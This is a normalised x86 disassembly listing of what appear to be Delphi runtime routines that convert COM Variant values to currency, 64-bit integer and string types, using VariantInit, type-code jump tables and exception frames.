lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_3a65528
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_3a6b06c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a73767
lea eax [ ebp - 0x14 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a65a7c
retn
movzx edx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_3a708b4
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x6
call sub_3a708b4
jmp r-xdata
sub_3a73770
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x6
call sub_3a708b4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3a737d0
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x6
call sub_3a708b4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_3a7381c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a73871
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_3a70f80
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_3a738cc
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a73878
lea eax [ ebp - 0x18 ]
call sub_3a70c58
retn
sub_3a73880
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_3a7618c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_3a738cc
push ebx
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_3a738e8 ]
mov eax ebx
call sub_3a736b4
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_3a737d0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_3a737d0
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_3a736b4
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_3a73770
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_3a738cc
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_3a737d0
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_3a7381c
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_3a70420
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_3a73880
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_3a737d0
fistp [ esp ]
fwait
mov eax ebx
call sub_3a737d0
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_3a73aec ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_3a737d0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_3a737d0
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_3a736b4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_3a73770
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_3a738cc
fistp [ esp ]
fwait
jmp r-xdata
sub_3a73c94
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_3a65a7c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_3a708b4
pop ebx
pop ebp
retn 0x8
sub_3a73ccc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_3a65a7c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_3a708b4
pop ebx
pop ebp
retn 0x8
sub_3a73d04
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a73dbc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3a65a7c
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_3a708b4
movzx eax [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a73dc3
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_3a652c4
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_3a65528
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_3a69270
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a65bdc
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_3a65528
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_3a691e8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_3a65bdc
jmp r-xdata
jmp r-xdata
call sub_3a704bc
sub_3a73dcc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a73e8b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a73e69
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x100
call sub_3a708b4
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_3a65ba0
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_3a65c8c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_3a65528
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a73e70
lea eax [ ebp - 0x10 ]
call sub_3a70c58
retn
sub_3a73e98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a73eee
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_3a70f80
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_3a73f84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a73ef5
lea eax [ ebp - 0x10 ]
call sub_3a70c58
retn
sub_3a73efc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
movzx eax [ ebx ]
call sub_3a7618c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a73f71
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_3a652f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_3a70c58
retn
sub_3a73f84
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a744b0
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_3a73fbe ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_3a652f4
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_3a652a0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_3a6986c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_3a6986c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_3a6af98
mov edx [ ebp - 0xc ]
mov eax esi
call sub_3a652f4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_3a6af98
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_3a73c94
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_3a65528
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_3a73ccc
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_3a65528
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_3a65c8c
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_3a65528
jmp r-xdata
lea edx [ ebp - 0x20 ]
movzx eax [ ebx + 0x8 ]
call sub_3a73d04
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_3a65528
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_3a6986c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
lea edx [ ebp - 0x28 ]
movzx eax [ ebx + 0x8 ]
call sub_3a6986c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_3a6986c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_3a652f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_3a69958
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_3a69958
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_3a73f84
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_3a73dcc
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a744b7
lea eax [ ebp - 0x74 ]
mov edx 0x7
call sub_3a652c4
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_3a65a94
lea eax [ ebp - 0x4c ]
mov edx 0xb
call sub_3a652c4
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_3a65a94
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_3a652c4
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_3a73e98
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_3a652f4
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_3a652f4
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_3a70420
test ah 0x40
je r-xdata
mov eax esi
call sub_3a652a0
mov edx eax
mov eax ebx
call sub_3a73efc
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_3a73dcc
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_3a652f4
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_3a73dcc
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
jmp [ eax * 4 + jump_table_3a74246 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_3a6986c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_3a6986c
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_3a6af98
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_3a6af98
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_3a652f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_3a73c94
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_3a65528
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_3a73ccc
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_3a65528
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_3a654c8
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_3a73d04
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_3a65528
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_3a6986c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_3a652f4
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_3a6986c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_3a6986c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_3a69958
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_3a652f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_3a69958
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_3a652f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_3a73f84
jmp r-xdata
sub_3a744c0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a7456a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a7454d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x8
call sub_3a708b4
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_3a65ba0
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_3a65c8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a74554
lea eax [ ebp - 0x10 ]
call sub_3a70c58
retn
sub_3a74578
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a745ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_3a70f80
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_3a746a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a745d5
lea eax [ ebp - 0x10 ]
call sub_3a70c58
retn
sub_3a745dc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_3a74694
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
movzx eax [ ebx ]
call sub_3a7618c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7469b
lea eax [ ebp - 0x20 ]
call sub_3a65a7c
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_3a74677
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_3a65ba0
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_3a65c8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_3a70c58
retn
sub_3a746a4
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a74be9
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_3a746dd ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_3a65bdc
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_3a65a7c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_3a6986c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_3a6986c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_3a6af98
mov edx [ ebp - 0xc ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_3a6af98
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_3a73c94
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_3a65ab8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_3a73ccc
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_3a65ab8
jmp r-xdata
push esi
mov eax [ ebx + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_3a65c8c
jmp r-xdata
lea edx [ ebp - 0x1c ]
movzx eax [ ebx + 0x8 ]
call sub_3a73d04
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_3a65ab8
jmp r-xdata
lea edx [ ebp - 0x20 ]
movsx eax [ ebx + 0x8 ]
call sub_3a6986c
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
lea edx [ ebp - 0x24 ]
movzx eax [ ebx + 0x8 ]
call sub_3a6986c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
lea edx [ ebp - 0x28 ]
movzx eax [ ebx + 0x8 ]
call sub_3a6986c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x2c ]
call sub_3a69958
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x30 ]
call sub_3a69958
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_3a746a4
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_3a744c0
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_3a65ab8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a74bf0
lea eax [ ebp - 0x70 ]
mov edx 0x2
call sub_3a65a94
lea eax [ ebp - 0x68 ]
mov edx 0x5
call sub_3a652c4
lea eax [ ebp - 0x54 ]
mov edx 0x3
call sub_3a65a94
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_3a652c4
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_3a65a94
lea eax [ ebp - 0x30 ]
mov edx 0x5
call sub_3a652c4
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_3a65a94
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_3a652c4
retn
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_3a74578
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_3a65ab8
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_3a65bdc
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_3a70420
test ah 0x40
je r-xdata
mov eax esi
call sub_3a65a7c
mov edx eax
mov eax ebx
call sub_3a745dc
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_3a744c0
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_3a65ab8
lea edx [ ebp - 0x6c ]
mov eax ebx
call sub_3a744c0
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_3a65ab8
jmp r-xdata
jmp [ eax * 4 + jump_table_3a74958 ]
lea edx [ ebp - 0x3c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_3a6986c
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_3a6986c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x44 ]
call sub_3a6af98
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_3a6af98
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_3a65bdc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x4c ]
call sub_3a73c94
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_3a65ab8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_3a73ccc
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_3a65ab8
jmp r-xdata
mov eax esi
